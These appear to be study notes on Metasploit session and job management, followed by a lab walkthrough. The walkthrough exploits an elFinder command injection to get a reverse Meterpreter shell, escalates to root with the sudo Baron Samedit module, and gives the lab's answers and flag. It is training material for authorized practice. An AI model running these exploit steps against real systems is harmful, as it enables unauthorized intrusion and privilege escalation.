# Sessions
MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of `Sessions`, which creates dedicated control interfaces for all of your deployed modules.

Once several sessions are created, we can switch between them and link a different module to one of the backgrounded sessions to run on it or turn them into jobs. Note that once a session is placed in the background, it will continue to run, and our connection to the target host will persist. Sessions can, however, die if something goes wrong during the payload runtime, causing the communication channel to tear down.
## Using Sessions
While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. This can be done either by pressing the `[CTRL] + [Z]` key combination or by typing the `background` command in the case of Meterpreter stages.

**Listing Active Sessions**
```
msf6 exploit(windows/smb/psexec_psh) > sessions
```
**Interacting with a Session**
You can use the sessions -i [no.] command to open up a specific session.
```
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```
## Jobs
If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using `[CTRL] + [C]`. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the `jobs` command to look at the currently active tasks running in the background and terminate the old ones to free up the port.

To list all running jobs, we can use the `jobs -l` command. To kill a specific job, look at the index no. of the job and use the `kill [index no.]` command. Use the `jobs -K` command to kill all running jobs.

When we run an exploit, we can run it as a job by typing `exploit -j`. Instead of just exploit or run, will "run it in the context of a job."
```
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

## Questions
1. The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application? **Answer: elfinder**
   - View the page source at http://10.129.203.52.
2. Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with? **Answer: www-data**
   - Use msfconsole and search for elfinder exploit modules: `search elfinder`
   - Use `exploit(linux/http/elfinder_archive_cmd_injection)` module and set the suitable `LHOST` and `RHOSTS`.
   - Run the exploit:
        ```
        [msf](Jobs:0 Agents:0) exploit(linux/http/elfinder_archive_cmd_injection) >> exploit
        ...
        (Meterpreter 1)(/var/www/html/files) > shell
        Process 1977 created.
        Channel 1 created.
        whoami
        www-data
        ```
3. The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer. **Answer: HTB{5e55ion5_4r3_sw33t}**
   - Still at the above meterpreter session, find the Sudo version and background that session to look for the suitable exploit:
        ```
        sudo -V
        Sudo version 1.8.31
        Sudoers policy plugin version 1.8.31
        Sudoers file grammar version 46
        Sudoers I/O plugin version 1.8.31
        exit
        ba(Meterpreter 1)(/var/www/html/files) > background
        [*] Backgrounding session 1...
        [msf](Jobs:0 Agents:1) exploit(linux/http/elfinder_archive_cmd_injection) >> search Sudo 
        ...
        63    \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
        ...
        ```
   - Use that exploit and set the `LHOST` to our host IP and `SESSION` to the session of the background process:
        ```
        [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> sessions

        Active sessions
        ===============

        Id  Name  Type                   Information               Connection
        --  ----  ----                   -----------               ----------
        1         meterpreter x86/linux  www-data @ 10.129.203.52  10.10.14.80:4444 -> 10.129.203.52:49694 (10.129.203.52)

        [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set LHOST 10.10.14.80
        LHOST => 10.10.14.80
        [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> set SESSION 1
        SESSION => 1
        [msf](Jobs:0 Agents:1) exploit(linux/local/sudo_baron_samedit) >> exploit
        ...
        [*] Meterpreter session 2 opened (10.10.14.80:4444 -> 10.129.203.52:49810) at 2025-10-01 22:20:58 -0500

        (Meterpreter 2)(/tmp) > shell
        Process 2236 created.
        Channel 1 created.
        whoami
        root
        find / -name "flag.txt"            
        /root/flag.txt
        cat /root/flag.txt
        HTB{5e55ion5_4r3_sw33t}
        ```